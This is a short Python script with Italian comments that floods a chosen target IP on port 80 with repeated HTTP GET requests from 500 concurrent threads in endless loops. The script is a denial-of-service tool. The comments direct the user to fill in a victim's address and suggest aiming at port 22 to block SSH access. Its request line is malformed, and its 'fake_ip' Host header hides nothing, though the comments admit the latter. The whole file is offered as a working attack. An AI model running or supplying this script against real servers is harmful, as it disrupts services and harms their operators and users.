import threading #multiple threads - simulato
import socket #per connettersi

target ='ip.address' #Inserire l'indirizzo IP del bersaglio
port = 80 #la porta 80 è usata per l'http, 443 per l'https, si potrebbe attaccare la porta 22 per impedire la connessione ssh etc
fake_ip = 'fake_ip' #un ip fittizio per mascherare il proprio, NON è un metodo di anonimizzazione

connessioni_effettuate = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port)) #Queste funzionano solo per la porta 80
        s.sendto(("host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global connessioni_effettuate #per vedere le connessioni effettuate, rallenta lo script
        connessioni_effettuate += 1
        if connessioni_effettuate % 500 == 0:
            print(connessioni_effettuate)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start() 

